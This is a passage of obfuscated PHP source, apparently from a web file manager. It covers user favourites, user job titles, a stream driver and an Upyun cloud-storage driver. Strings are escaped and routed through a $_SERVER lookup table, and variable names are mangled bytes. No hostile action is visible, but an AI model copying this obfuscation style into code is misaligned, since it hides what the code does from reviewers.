"\145\x6e\141\x62\154\145", "\154\x61\x73\164\x52\x75\x6e", "\x73\x6f\x72\x74"); public function listData($”Ì¶†Û = false, $ÉĞ©ÊÈ± = "\163\157\162\164", $ÒÜçø¸º = false) { return parent::listData($”Ì¶†Û, $ÉĞ©ÊÈ±, $ÒÜçø¸º); } public function add($™¹õ¶ŠĞ) { $ÔñÆâ€Ú =& $_SERVER[™¾ÇÙ¯¹]; $œ’‚ãÛÆ = $this->findByName($™¹õ¶ŠĞ[$ÔñÆâ€Ú[32]]); if ($œ’‚ãÛÆ) { return !1; } $™¹õ¶ŠĞ[$ÔñÆâ€Ú[1625]] = 0; $™¹õ¶ŠĞ[$ÔñÆâ€Ú[1861]] = $this->getSort(); return parent::insert($™¹õ¶ŠĞ); } private function getSort() { $ßÌ¬ÙÕ§ =& $_SERVER[™¾ÇÙ¯¹]; $’Ù–Ç â = parent::listData(); $Í‚Ï¦Â‰ = array_to_keyvalue($’Ù–Ç â, $ßÌ¬ÙÕ§[12], $ßÌ¬ÙÕ§[1861]); return empty($Í‚Ï¦Â‰) ? 0 : max($Í‚Ï¦Â‰) + 1; } public function update($È–ŒÃ”Î, $İ¶´ŞÏ) { $¶Èº¶Õï =& $_SERVER[™¾ÇÙ¯¹]; $ÀÉİúÆ  = $this->listData($È–ŒÃ”Î); $÷í°Ú — = $this->findByName($İ¶´ŞÏ[$¶Èº¶Õï[32]]); if (!$ÀÉİúÆ  || $÷í°Ú — && $÷í°Ú —[$¶Èº¶Õï[407]] != $ÀÉİúÆ [$¶Èº¶Õï[407]]) { return !1; } return parent::update($È–ŒÃ”Î, $İ¶´ŞÏ); } public function remove($ËÛä°¿, $ââ¸™¬å = false) { $ŒŠªÚü­ =& $_SERVER[™¾ÇÙ¯¹]; $ìñäøÇå = $this->listData($ËÛä°¿); if (!$ìñäøÇå) { return; } if (!$ââ¸™¬å && $ìñäøÇå[$ŒŠªÚü­[1284]] == $ŒŠªÚü­[88]) { return !1; } return parent::remove($ËÛä°¿); } public function enable($ ÒºÅÉâ, $“¨Ä¬ç¬) { return $this->update($ ÒºÅÉâ, array($_SERVER[™¾ÇÙ¯¹][2266] => $“¨Ä¬ç¬)); } public function run($ÆğµÀËˆ) { return $this->update($ÆğµÀËˆ, array($_SERVER[™¾ÇÙ¯¹][2278] => time())); } } class UserFavModel extends ModelBase { protected $tableName = "\x75\163\x65\x72\x5f\146\141\166"; protected function cacheFunctionAlias($©ÂØµñ) { $¸ÖÇ˜… =& $_SERVER[™¾ÇÙ¯¹]; return array($¸ÖÇ˜…[1948] => array(USER_ID, $¸ÖÇ˜…[2279])); } protected function listData() { $öıÄ¶ıÜ =& $_SERVER[™¾ÇÙ¯¹]; $ù´® Ç = array($öıÄ¶ıÜ[1656] => USER_ID, $öıÄ¶ıÜ[492] => 0); $ª—™²ßö = $öıÄ¶ıÜ[2280]; $§ÌÔ‡ü = $this->field($ª—™²ßö)->where($ù´® Ç)->order($öıÄ¶ıÜ[2281])->select(); return $§ÌÔ‡ü ? $§ÌÔ‡ü : array(); } protected function resetCache() { } protected function listView() { $‘İéü” =& $_SERVER[™¾ÇÙ¯¹]; $ƒ©ıâÚ£ = $this->listData(); $œÁà˜şİ = array_filter_by_field($ƒ©ıâÚ£, $‘İéü”[33], $‘İéü”[424]); $–ÚÀ— = array_to_keyvalue($œÁà˜şİ, $‘İéü”[12], $‘İéü”[84]); if (!$–ÚÀ—) { return $ƒ©ıâÚ£; } $í¹›Ì³á = 2000; $Œ§”÷©— = array($‘İéü”[425] => array($‘İéü”[426], $–ÚÀ—)); $­›ı¢¯¤ = Model($‘İéü”[840])->listSource($Œ§”÷©—, $í¹›Ì³á); $­›ı¢¯¤ = array_merge($­›ı¢¯¤[$‘İéü”[83]], $­›ı¢¯¤[$‘İéü”[82]]); $­›ı¢¯¤ = array_to_keyvalue($­›ı¢¯¤, $‘İéü”[410]); foreach ($ƒ©ıâÚ£ as $Èá×»ã¤ => $ıåóÂ¼) { $ş­‹ëèÚ = $­›ı¢¯¤[$ıåóÂ¼[$‘İéü”[84]]]; $ş­‹ëèÚ = $ş­‹ëèÚ ? $ş­‹ëèÚ : array(); $ƒ©ıâÚ£[$Èá×»ã¤] = array_merge($ş­‹ëèÚ, $ıåóÂ¼); } return $ƒ©ıâÚ£; } protected function addFav($‰èÁ«ö, $óìú‚­Ÿ = '', $Æõû¹£¸ = "\163\x6f\x75\x72\x63\145") { $½ …ÓÒ² =& $_SERVER[™¾ÇÙ¯¹]; $Á×Ÿ Ø = array($½ …ÓÒ²[1656] => USER_ID, $½ …ÓÒ²[492] => 0, $½ …ÓÒ²[430] => $Æõû¹£¸, $½ …ÓÒ²[429] => $‰èÁ«ö); if ($this->where($Á×Ÿ Ø)->find()) { return !1; } $Á×Ÿ Ø = array($½ …ÓÒ²[1656] => USER_ID, $½ …ÓÒ²[492] => 0); $şë„ªÇÃ = $this->where($Á×Ÿ Ø)->max($½ …ÓÒ²[1861]); if (!$şë„ªÇÃ) { $şë„ªÇÃ = 0; } if (!$óìú‚­Ÿ && $Æõû¹£¸ == $½ …ÓÒ²[424]) { $áö§å›Ì = Model($½ …ÓÒ²[1335])->where(array($½ …ÓÒ²[425] => $‰èÁ«ö))->find(); if (!$áö§å›Ì) { return !1; } $óìú‚­Ÿ = $áö§å›Ì[$½ …ÓÒ²[32]]; } $óìú‚­Ÿ = $this->getAutoName($óìú‚­Ÿ); $ÚÈÒµ¶Ú = array($½ …ÓÒ²[1656] => USER_ID, $½ …ÓÒ²[492] => 0, $½ …ÓÒ²[428] => $óìú‚­Ÿ, $½ …ÓÒ²[429] => $‰èÁ«ö, $½ …ÓÒ²[430] => $Æõû¹£¸, $½ …ÓÒ²[1841] => $şë„ªÇÃ + 1); return $this->add($ÚÈÒµ¶Ú); } protected function remove($èÀ¥Æ›Ò) { $ê­È„°‡ =& $_SERVER[™¾ÇÙ¯¹]; $œ¼Ù¢œ… = array($ê­È„°‡[1656] => USER_ID, $ê­È„°‡[427] => $èÀ¥Æ›Ò); return $this->where($œ¼Ù¢œ…)->delete(); } protected function removeByName($÷©åªïß) { $É‘À‚£’ =& $_SERVER[™¾ÇÙ¯¹]; $æ©±ñó• = array($É‘À‚£’[1656] => USER_ID, $É‘À‚£’[428] => $÷©åªïß, $É‘À‚£’[492] => 0); return $this->where($æ©±ñó•)->delete(); } protected function rename($”¸…îçÙ, $Ç¥¡±÷ˆ) { $â³ ”›ñ =& $_SERVER[™¾ÇÙ¯¹]; if ($”¸…îçÙ == $Ç¥¡±÷ˆ) { return !1; } $®”€„ÒÙ = $this->getAutoName($Ç¥¡±÷ˆ); if ($Ç¥¡±÷ˆ != $®”€„ÒÙ) { return !1; } $¥§ÎËËÎ = array($â³ ”›ñ[1656] => USER_ID, $â³ ”›ñ[492] => 0, $â³ ”›ñ[32] => $”¸…îçÙ); return $this->where($¥§ÎËËÎ)->save(array($â³ ”›ñ[32] => $Ç¥¡±÷ˆ)); } protected function resetSort($êíÛöá•) { $»½…õâÂ =& $_SERVER[™¾ÇÙ¯¹]; $êíÛöá• = is_array($êíÛöá•) ? $êíÛöá• : array(); $ÙÄîŞ™ = array($»½…õâÂ[1656] => USER_ID); for ($Àşº±“¿ = 0; $Àşº±“¿ < count($êíÛöá•); $Àşº±“¿++) { $ÙÄîŞ™[$»½…õâÂ[427]] = $êíÛöá•[$Àşº±“¿]; $this->where($ÙÄîŞ™)->save(array($»½…õâÂ[1841] => $Àşº±“¿ + 1)); } return !0; } protected function moveTop($š…¤Ó•¾) { $»¡»ÑØë =& $_SERVER[™¾ÇÙ¯¹]; $÷ï»¨èé = array($»¡»ÑØë[1656] => USER_ID, $»¡»ÑØë[492] => 0); $¾Ùº§Àõ = $this->where($÷ï»¨èé)->where(array($»¡»ÑØë[32] => $š…¤Ó•¾))->find(); if (!$¾Ùº§Àõ) { return; } $¦èÜ±áÇ = $this->field($»¡»ÑØë[407])->where($÷ï»¨èé)->order($»¡»ÑØë[2281])->select(); $¦èÜ±áÇ = array_to_keyvalue($¦èÜ±áÇ, $»¡»ÑØë[12], $»¡»ÑØë[407]); $‚Ş¤µÃ· = $¦èÜ±áÇ; $¦èÜ±áÇ = array_remove_value($¦èÜ±áÇ, $¾Ùº§Àõ[$»¡»ÑØë[407]]); array_unshift($¦èÜ±áÇ, $¾Ùº§Àõ[$»¡»ÑØë[407]]); return $this->resetSort($¦èÜ±áÇ); } protected function moveBottom($ÕŸù‡ÎÜ) { $ñêµèú =& $_SERVER[™¾ÇÙ¯¹]; $›­ñŸµ = array($ñêµèú[1656] => USER_ID, $ñêµèú[492] => 0); $Æñ¢¥òİ = $this->where($›­ñŸµ)->max($ñêµèú[1861]); $•åì°Š½ = array($ñêµèú[1861] => $Æñ¢¥òİ + 1); return $this->where($›­ñŸµ)->where(array($ñêµèú[32] => $ÕŸù‡ÎÜ))->save($•åì°Š½); } private function getAutoName($ÄœÖÁãË) { $šÓåãÌ =& $_SERVER[™¾ÇÙ¯¹]; $–ÕìŸ†¶ = array($šÓåãÌ[1656] => USER_ID, $šÓåãÌ[492] => 0); $¶ÚÄí®Š = $this->field($šÓåãÌ[32])->where($–ÕìŸ†¶)->select(); $¶ÚÄí®Š = array_to_keyvalue($¶ÚÄí®Š, $šÓåãÌ[12], $šÓåãÌ[32]); if (!$¶ÚÄí®Š || !in_array($ÄœÖÁãË, $¶ÚÄí®Š)) { return $ÄœÖÁãË; } for ($ÆàÓì¿‰ = 0; $ÆàÓì¿‰ < count($¶ÚÄí®Š); $ÆàÓì¿‰++) { if (!in_array($ÄœÖÁãË . "\50{$ÆàÓì¿‰}\51", $¶ÚÄí®Š)) { return $ÄœÖÁãË . "\50{$ÆàÓì¿‰}\x29"; } } return $ÄœÖÁãË . "\50{$ÆàÓì¿‰}\51"; } } class UserJobModel extends ModelBaseLight { public $optionType = "\123\171\x73\164\145\x6d\x2e\x6a\x6f\x62\x4c\x69\x73\x74"; public $field = array("\x6e\141\x6d\x65", "\144\145\163\143", "\163\157\162\164"); const JOB_KEY = "\163\x65\154\146\112\157\x62\x4c\x69\163\x74"; public function listData($ûÚÌ´ƒ = false, $¡ˆ¯ñ¸± = "\163\x6f\162\x74", $‘ˆËöÓ = false) { return parent::listData($ûÚÌ´ƒ, $¡ˆ¯ñ¸±, $‘ˆËöÓ); } public function remove($ÒæÎŒà) { return parent::remove($ÒæÎŒà); } public function add($–¨Ô”Š) { $¯ïÅ¦°˜ =& $_SERVER[™¾ÇÙ¯¹]; if ($this->findByName($–¨Ô”Š[$¯ïÅ¦°˜[32]])) { return !1; } $–¨Ô”Š[$¯ïÅ¦°˜[1861]] = $this->getSort(); return parent::insert($–¨Ô”Š); } private function getSort() { $ùÃõØßŒ =& $_SERVER[™¾ÇÙ¯¹]; $Íã¿–Æ‰ = parent::listData(); $ã”í¤á = array_to_keyvalue($Íã¿–Æ‰, $ùÃõØßŒ[12], $ùÃõØßŒ[1861]); return empty($ã”í¤á) ? 0 : max($ã”í¤á) + 1; } public function update($¨‡¤¦Ô, $ÁŒûïÏŒ) { $ñì‡³ÀÅ =& $_SERVER[™¾ÇÙ¯¹]; $œÅ—ˆ° = parent::listData($¨‡¤¦Ô); $–ù¦ÖÔß = $this->findByName($ÁŒûïÏŒ[$ñì‡³ÀÅ[32]]); if (!$œÅ—ˆ° || $–ù¦ÖÔß && $–ù¦ÖÔß[$ñì‡³ÀÅ[407]] != $œÅ—ˆ°[$ñì‡³ÀÅ[407]]) { return !1; } return parent::update($¨‡¤¦Ô, $ÁŒûïÏŒ); } public function setUserJob($Í£¶–·Ü, $¤‰ÉÍí½) { $öú‹Äñ… =& $_SERVER[™¾ÇÙ¯¹]; if (!is_array($¤‰ÉÍí½)) { $¤‰ÉÍí½ = array($¤‰ÉÍí½); } $ÇêÊúú» = parent::listData(); $ó›Ş»ĞÄ = array_to_keyvalue($ÇêÊúú», $öú‹Äñ…[32]); $×¬­›ä» = $öú‹Äñ…[252]; foreach ($¤‰ÉÍí½ as $‹²£¯ë½) { if ($ó›Ş»ĞÄ[$‹²£¯ë½]) { $×¬­›ä» .= $ó›Ş»ĞÄ[$‹²£¯ë½][$öú‹Äñ…[407]] . $öú‹Äñ…[50]; } else { $¨™€¸¨º = $this->add($‹²£¯ë½); $×¬­›ä» .= $¨™€¸¨º . $öú‹Äñ…[50]; } } $×¬­›ä» = rtrim($×¬­›ä», $öú‹Äñ…[50]); Model($öú‹Äñ…[543])->metaSet($Í£¶–·Ü, self::JOB_KEY, $×¬­›ä»); } public function getUserJob($ù›„“î) { $Ñ¼ç†×ş = Model($_SERVER[™¾ÇÙ¯¹][543])->metaGet($ù›„“î); return $this->getUserJobInfo($Ñ¼ç†×ş[self::JOB_KEY]); } public function getUserJobInfo($…¿•Šœà) { $¼ã”²ª =& $_SERVER[™¾ÇÙ¯¹]; $Õë¨ô¸Æ = explode($¼ã”²ª[50], $…¿•Šœà); $óÃªı¥ = parent::listData(); $óÃªı¥ = array_remove_key($óÃªı¥, $¼ã”²ª[200]); $ƒƒòâ€© = array(); foreach ($Õë¨ô¸Æ as $Áàúõ) { if (isset($óÃªı¥[$Áàúõ])) { $ƒƒòâ€©[] = $óÃªı¥[$Áàúõ]; } } return $ƒƒòâ€©; } } goto AìÃŸëŠõ´; aëîÊ§ôŒï: class PathDriverStream extends PathDriverBase { const TYPE_STRING = 1; const TYPE_FILE = 2; public function __construct($ÄÂ¸‘â, $‚“õ“› = 0) { parent::__construct(); $this->source = $ÄÂ¸‘â; $this->sourceSize = $‚“õ“›; if (is_string($this->source)) { $this->sourceType = self::TYPE_STRING; $this->sourceSize = strlen($this->source); } else { $this->sourceType = self::TYPE_FILE; } } public function size($ÙÔÉøŒÎ = false) { return $this->sourceSize; } public function getContent($Ñåìøï = false) { return $this->fileSubstr($Ñåìøï, 0, $this->sourceSize); } public function fileSubstr($¹“¾Äíú = false, $–§Äö‰Ö = 0, $¸²ò´¬” = 0) { if (!$¸²ò´¬”) { $¸²ò´¬” = $this->sourceSize; } $„ÄÈáì® = $this->sourceSize - $–§Äö‰Ö; if ($¸²ò´¬” >= $„ÄÈáì®) { $¸²ò´¬” = $„ÄÈáì®; } if ($this->sourceType == self::TYPE_STRING) { return substr($this->source, $–§Äö‰Ö, $¸²ò´¬”); } if ($this->sourceType == self::TYPE_FILE) { if ($¸²ò´¬” <= 0) { return $_SERVER[™¾ÇÙ¯¹][12]; } $Œ…‡°Œ¥ = ftell($this->source); fseek_64($this->source, $Œ…‡°Œ¥ + $–§Äö‰Ö); $×°ó¹á = @fread($this->source, $¸²ò´¬”); fseek_64($this->source, $Œ…‡°Œ¥); return $×°ó¹á; } } public function hashMd5($…åşÁ¼ = false) { return md5($this->getContent()); } public static function hash($äú¬èª, $Á‘ş×ÀÏ = 0) { $ş¿½î»œ = new PathDriverStream($äú¬èª, $Á‘ş×ÀÏ); return $ş¿½î»œ->hashSimple($äú¬èª); } public static function md5($§õåĞ¬’, $Â•Û¥Æ = 0) { $ê·ñŞı” = new PathDriverStream($§õåĞ¬’, $Â•Û¥Æ); return $ê·ñŞı”->hashMd5($§õåĞ¬’); } } class PathDriverUSS extends PathDriverBase { protected $bucket = ''; protected $username = ''; protected $userpass = ''; protected $domain = ''; protected $token = ''; protected $endpoint = "\x68\x74\164\x70\x3a\x2f\x2f\166\x30\x2e\x61\x70\x69\56\x75\x70\x79\x75\156\x2e\143\x6f\155"; public $ioUploadServer = 0; public $ioFileOutServer = 0; public function __construct($²„èÀÀñ) { parent::__construct(); $this->_init($²„èÀÀñ); } public function _init($÷‘’ˆß) { $¿ûâÃ£¬ =& $_SERVER[™¾ÇÙ¯¹]; foreach ($÷‘’ˆß as $¼Õ—ÀÁ³ => $Éö™ºà•) { if (isset($this->{$¼Õ—ÀÁ³})) { $this->{$¼Õ—ÀÁ³} = $Éö™ºà•; } } if (empty($this->username) || empty($this->userpass) || empty($this->domain)) { throw new Exception($¿ûâÃ£¬[1461] . LNG($¿ûâÃ£¬[1392])); } } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } private function ussHeaders($ö‰Õê¢˜, $±Ã±¸‡õ = "\x47\105\124") { $—µèûËÊ =& $_SERVER[™¾ÇÙ¯¹]; $…Œ½ää„ = gmdate($—µèûËÊ[1425]); $ÔÀŒ•çî = base64_encode(hash_hmac($—µèûËÊ[1462], "{$±Ã±¸‡õ}\46{$ö‰Õê¢˜}\46{$…Œ½ää„}", md5("{$this->userpass}"), !0)); $¥˜õÉä• = array("\101\165\x74\x68\x6f\162\151\172\141\164\x69\157\x6e\x3a\125\x50\x59\125\116\x20{$this->username}\x3a{$ÔÀŒ•çî}", "\x44\141\x74\145\x3a{$…Œ½ää„}"); return $¥˜õÉä•; } public function ussRequest($òÁœš·Ó, $ú¤‰Í² = "\x47\x45\x54", $ÈÓŸ’ = false, $õ‚¯ì‰¤ = false, $âÖÌ˜¶ = false) { $ö¹Šã¡ =& $_SERVER[™¾ÇÙ¯¹]; $òÁœš·Ó = trim($òÁœš·Ó, $ö¹Šã¡[8]); $ÈšöÅ”‚ = "\x2f{$this->bucket}\x2f{$òÁœš·Ó}"; $ÊÔŠº™ş = $this->ussHeaders($ÈšöÅ”‚, $ú¤‰Í²); if ($õ‚¯ì‰¤) { $ÊÔŠº™ş = array_merge($ÊÔŠº™ş, $õ‚¯ì‰¤); } $ä¶âª¡™ = url_request($this->endpoint . $ÈšöÅ”‚, $ú¤‰Í², $ÈÓŸ’, $ÊÔŠº™ş, $âÖÌ˜¶); if (!$ä¶âª¡™) { return array($ö¹Šã¡[1199] => !1, $ö¹Šã¡[1201] => $ö¹Šã¡[1463]); } if (strtolower($ú¤‰Í²) == $ö¹Šã¡[196] || in_array($ä¶âª¡™[$ö¹Šã¡[1199]], array($ö¹Šã¡[1318], $ö¹Šã¡[1464]))) { $ÈÓŸ’ = $ä¶âª¡™[$ö¹Šã¡[1465]]; } else { $ÈÓŸ’ = json_decode($ä¶âª¡™[$ö¹Šã¡[1201]], !0); if (!$ÈÓŸ’) { $ÈÓŸ’ = $ä¶âª¡™[$ö¹Šã¡[1201]]; } else { if (!$ä¶âª¡™[$ö¹Šã¡[765]] && isset($ÈÓŸ’[$ö¹Šã¡[1466]])) { $ÈÓŸ’ = $ÈÓŸ’[$ö¹Šã¡[1466]]; } } } return array($ö¹Šã¡[1199] => $ä¶âª¡™[$ö¹Šã¡[765]], $ö¹Šã¡[1201] => $ÈÓŸ’); } public function mkfile($„·Úª…», $¾Ìöâ”¬ = '', $ÔêÖÖİ = REPEAT_RENAME) { if ($this->setContent($„·Úª…», $¾Ìöâ”¬)) { return $this->getPathOuter($„·Úª…»); } return !1; } public function mkdir($¹©€¨È•, $ø·¶ = REPEAT_SKIP) { $¤åŞ×çõ =& $_SERVER[™¾ÇÙ¯¹]; $–…Õ˜ğš = trim($¹©€¨È•, $¤åŞ×çõ[8]); if ($this->_isFolder($–…Õ˜ğš)) { return $this->getPathOuter($–…Õ˜ğš); } $×òæïÈ® = array($¤åŞ×çõ[1467]); $½ãª§Ò = $this->ussRequest($–…Õ˜ğš, $¤åŞ×çõ[226], !1, $×òæïÈ®); return $½ãª§Ò[$¤åŞ×çõ[1199]] ? $this->getPathOuter($–…Õ˜ğš) : !1; } public function copyFile($×óºİá, $Ñ™éĞš›) { $¯î€×ë¡ =& $_SERVER[™¾ÇÙ¯¹]; $¬…²²±² = array($¯î€×ë¡[1468] . "\57{$this->bucket}\57{$×óºİá}", $¯î€×ë¡[1469]); $¨­…ãçˆ = $this->ussRequest($Ñ™éĞš›, $¯î€×ë¡[228], !1, $¬…²²±²); return $¨­…ãçˆ[$¯î€×ë¡[1199]] ? !0 : $this->getPathOuter($Ñ™éĞš›); } public function moveFile($Ëîå•Ø×, $á”×ÈàŒ) { $ÎŸ¹ÚÉ =& $_SERVER[™¾ÇÙ¯¹]; $ìÙí¶Ö = array($ÎŸ¹ÚÉ[1470] . "\x2f{$this->bucket}\x2f{$Ëîå•Ø×}", $ÎŸ¹ÚÉ[1469]); $ÀÕ°ò‡‹ = $this->ussRequest($á”×ÈàŒ, $ÎŸ¹ÚÉ[228], !1, $ìÙí¶Ö); return $ÀÕ°ò‡‹[$ÎŸ¹ÚÉ[1199]] ? !0 : $this->getPathOuter($á”×ÈàŒ); } public function delFile($“›Ï½†µ) { $î‘í¡ˆè =& $_SERVER[™¾ÇÙ¯¹]; $€ÛÛÅÍÀ = $this->ussRequest($“›Ï½†µ, $î‘í¡ˆè[1471]); return $€ÛÛÅÍÀ[$î‘í¡ˆè[1199]] ? !0 : !1; } public function delFolder($ß¤õ›ÃŒ) { $¾Ö€«¹â =& $_SERVER[™¾ÇÙ¯¹]; if (!$this->exist($ß¤õ›ÃŒ)) { return !0; } $this->listItemCache = !1; $¡îÔ¦î« = $©–®Ö¼» = array(); $this->fileList($ß¤õ›ÃŒ, $¡îÔ¦î«, $©–®Ö¼», !0); $this->listItemCache = !0; foreach ($©–®Ö¼» as $¯¾›åÊ) { $Ğ·…• = $this->ussRequest($¯¾›åÊ[$¾Ö€«¹â[32]], $¾Ö€«¹â[1471]); if (!$Ğ·…•[$¾Ö€«¹â[1199]]) { return !1; } } foreach ($¡îÔ¦î« as $’Âë ÷) { $Ğ·…• = $this->ussRequest($’Âë ÷, $¾Ö€«¹â[1471]); if (!$Ğ·…•[$¾Ö€«¹â[1199]]) { return !1; } } $Ğ·…• = $this->ussRequest($ß¤õ›ÃŒ, $¾Ö€«¹â[1471]); return $Ğ·…•[$¾Ö€«¹â[1199]]; } public function rename($êšî‡×†, $İ’íÊşŞ) { if ($this->isFile($êšî‡×†)) { $İ’íÊşŞ = get_path_father($êšî‡×†) . $İ’íÊşŞ; return $this->moveFile($êšî‡×†, $İ’íÊşŞ); } return $this->renameObject($êšî‡×†, $İ’íÊşŞ); } public function fileInfo($ƒˆÏ›à, $ÆÂŒäïˆ = false, $øØâ÷ü = array()) { $“äøë™Ü =& $_SERVER[™¾ÇÙ¯¹]; $—ÏÅÄåÙ = array($“äøë™Ü[32] => $this->pathThis($ƒˆÏ›à), $“äøë™Ü[84] => $this->getPathOuter($“äøë™Ü[8] . $ƒˆÏ›à), $“äøë™Ü[33] => $“äøë™Ü[199], $“äøë™Ü[76] => isset($øØâ÷ü[$“äøë™Ü[76]]) ? $øØâ÷ü[$“äøë™Ü[76]] : 0, $“äøë™Ü[174] => $this->ext($ƒˆÏ›à)); if ($ÆÂŒäïˆ) { return $—ÏÅÄåÙ; } $—ÏÅÄåÙ[$“äøë™Ü[200]] = $—ÏÅÄåÙ[$“äøë™Ü[85]] = 0; $—ÏÅÄåÙ[$“äøë™Ü[201]] = $—ÏÅÄåÙ[$“äøë™Ü[202]] = !0; if (empty($øØâ÷ü)) { $øØâ÷ü = $this->objectMeta($ƒˆÏ›à); if (!$øØâ÷ü) { return $—ÏÅÄåÙ; } } $—ÏÅÄåÙ[$“äøë™Ü[200]] = intval($øØâ÷ü[$“äøë™Ü[1472]]); $—ÏÅÄåÙ[$“äøë™Ü[85]] = intval($øØâ÷ü[$“äøë™Ü[1473]]); $—ÏÅÄåÙ[$“äøë™Ü[76]] = $øØâ÷ü[$“äøë™Ü[76]]; return $—ÏÅÄåÙ; } public function folderInfo($½…éıá„, $„ëº…ÁÊ = false) { $¬Á§÷ÖÁ =& $_SERVER[™¾ÇÙ¯¹]; $µÀéàÌ¦ = array($¬Á§÷ÖÁ[32] => $this->pathThis($½…éıá„), $¬Á§÷ÖÁ[84] => $this->getPathOuter($¬Á§÷ÖÁ[8] . $½…éıá„), $¬Á§÷ÖÁ[33] => $¬Á§÷ÖÁ[75]); if ($„ëº…ÁÊ) { return $µÀéàÌ¦; } $µÀéàÌ¦[$¬Á§÷ÖÁ[200]] = $µÀéàÌ¦[$¬Á§÷ÖÁ[85]] = 0; $µÀéàÌ¦[$¬Á§÷ÖÁ[201]] = $µÀéàÌ¦[$¬Á§÷ÖÁ[202]] = !0; if (empty($±‚ıºÅ–)) { $±‚ıºÅ– = $this->objectMeta($½…éıá„); if (!$±‚ıºÅ–) { return $µÀéàÌ¦; } } $µÀéàÌ¦[$¬Á§÷ÖÁ[200]] = intval($±‚ıºÅ–[$¬Á§÷ÖÁ[1472]]); $µÀéàÌ¦[$¬Á§÷ÖÁ[85]] = intval($±‚ıºÅ–[$¬Á§÷ÖÁ[1473]]); return $µÀéàÌ¦; } private function listObjs($ÍòñŒş, $âş†æ›µ = 0, $‘Ñ¡è—• = 1000) { $ÇÂ”îÈê =& $_SERVER[™¾ÇÙ¯¹]; $Ù¤ç­¬‚ = array($ÇÂ”îÈê[1474], $ÇÂ”îÈê[1475] . $‘Ñ¡è—•); if ($âş†æ›µ) { $Ù¤ç­¬‚[] = $ÇÂ”îÈê[1476] . $âş†æ›µ; } $û¨™Ô¼· = $this->ussRequest($ÍòñŒş, $ÇÂ”îÈê[230], !1, $Ù¤ç­¬‚); return !$û¨™Ô¼·[$ÇÂ”îÈê[1199]] ? !1 : $û¨™Ô¼·[$ÇÂ”îÈê[1201]]; } private function fileList($‚Ê÷ä¯û, &$£¾ÒÃÉ§, &$ÜâŒüòâ, $ê¨×€‹ò = false) { $›¨ÀÈ‰Ê =& $_SERVER[™¾ÇÙ¯¹]; $¾üº±õ± = $›¨ÀÈ‰Ê[12]; $–€êŞ‰º = 1000; $¨ƒÈë€ä = rtrim($‚Ê÷ä¯û, $›¨ÀÈ‰Ê[8]) . $›¨ÀÈ‰Ê[8]; while (!0) { check_abort(); $•Î³¢´¸ = $this->listObjs($‚Ê÷ä¯û, $¾üº±õ±, $–€êŞ‰º); if (!$•Î³¢´¸) { return !1; } $¾üº±õ± = isset($•Î³¢´¸[$›¨ÀÈ‰Ê[1477]]) ? $•Î³¢´¸[$›¨ÀÈ‰Ê[1477]] : $›¨ÀÈ‰Ê[12]; $Ä’Úé—‡ = isset($•Î³¢´¸[$›¨ÀÈ‰Ê[1478]]) ? $•Î³¢´¸[$›¨ÀÈ‰Ê[1478]] : array(); foreach ($Ä’Úé—‡ as $½ÌÖÅÆè) { $ŞûßÊûû = $½ÌÖÅÆè[$›¨ÀÈ‰Ê[33]] == $›¨ÀÈ‰Ê[75] ? !0 : !1; $¥ â„ÍÄ = ltrim($¨ƒÈë€ä . $½ÌÖÅÆè[$›¨ÀÈ‰Ê[32]], $›¨ÀÈ‰Ê[8]) . ($ŞûßÊûû ? $›¨ÀÈ‰Ê[8] : $›¨ÀÈ‰Ê[12]); $İÂ“ø…Î = array($›¨ÀÈ‰Ê[32] => $¥ â„ÍÄ, $›¨ÀÈ‰Ê[33] => $ŞûßÊûû ? $›¨ÀÈ‰Ê[75] : $›¨ÀÈ‰Ê[199], $›¨ÀÈ‰Ê[76] => $½ÌÖÅÆè[$›¨ÀÈ‰Ê[346]], $›¨ÀÈ‰Ê[1473] => $½ÌÖÅÆè[$›¨ÀÈ‰Ê[1479]]); $this->cacheMethodInfoSet($¥ â„ÍÄ, $ŞûßÊûû, $İÂ“ø…Î); if ($ŞûßÊûû) { $£¾ÒÃÉ§[] = $¥ â„ÍÄ; if ($ê¨×€‹ò) { $this->fileList($¥ â„ÍÄ, $£¾ÒÃÉ§, $ÜâŒüòâ, $ê¨×€‹ò); } continue; } $ÜâŒüòâ[] = $İÂ“ø…Î; } if (count($Ä’Úé—‡) < $–€êŞ‰º) { break; } } $this->cacheMethodInfoSet($‚Ê÷ä¯û, !0); } public function listPath($£ñß®Ÿ£, $‰»ø¢— = false) { $›Îï€×‡ =& $_SERVER[™¾ÇÙ¯¹]; $›øî›ñƒ = $çšéÕ¡· = array(); $this->fileList($£ñß®Ÿ£, $›øî›ñƒ, $çšéÕ¡·); foreach ($›øî›ñƒ as $è¤òÉÀ’ => $Ó°Ôéƒæ) { $›øî›ñƒ[$è¤òÉÀ’] = $this->folderInfo($Ó°Ôéƒæ, $‰»ø¢—); } foreach ($çšéÕ¡· as $è¤òÉÀ’ => $Ó°Ôéƒæ) { $çšéÕ¡·[$è¤òÉÀ’] = $this->fileInfo($Ó°Ôéƒæ[$›Îï€×‡[32]], $‰»ø¢—, $Ó°Ôéƒæ); } return array($›Îï€×‡[82] => $›øî›ñƒ, $›Îï€×‡[83] => $çšéÕ¡·); } public function has($¾Áî›õ², $óòıÕùØ = false, $•Ú¡Îã· = true) { $–ı•è¥û =& $_SERVER[™¾ÇÙ¯¹]; $ü±æŒƒš = $–ı•è¥û[12]; $“‰®Â¡ = 500; $ÖÜÄ×«¶ = 0; $«î‡¤Ôª = 0; $¥ÂĞİÈË = rtrim($¾Áî›õ², $–ı•è¥û[8]) . $–ı•è¥û[8]; while (!0) { check_abort(); $‰Öè‘– = $this->listObjs($¾Áî›õ², $ü±æŒƒš, $“‰®Â¡); if (!$‰Öè‘–) { return !1; } $ü±æŒƒš = isset($‰Öè‘–[$–ı•è¥û[1477]]) ? $‰Öè‘–[$–ı•è¥û[1477]] : $–ı•è¥û[12]; $ª›µÑĞü = isset($‰Öè‘–[$–ı•è¥û[1478]]) ? $‰Öè‘–[$–ı•è¥û[1478]] : array(); if (empty($ª›µÑĞü)) { break; } $ôè¤§´× = array_filter($ª›µÑĞü, function ($óµĞ¼›) { $÷İÖ¾Ğí =& $_SERVER[™¾ÇÙ¯¹]; return $óµĞ¼›[$÷İÖ¾Ğí[33]] == $÷İÖ¾Ğí[75]; }); $­ßıø˜¬ = count($ª›µÑĞü); $ôè¤§´× = count($ôè¤§´×); $Ô½ÀÚ« = $­ßıø˜¬ - $ôè¤§´×; if ($óòıÕùØ) { $«î‡¤Ôª += $ôè¤§´×; $ÖÜÄ×«¶ += $Ô½ÀÚ«; if ($­ßıø˜¬ < $“‰®Â¡) 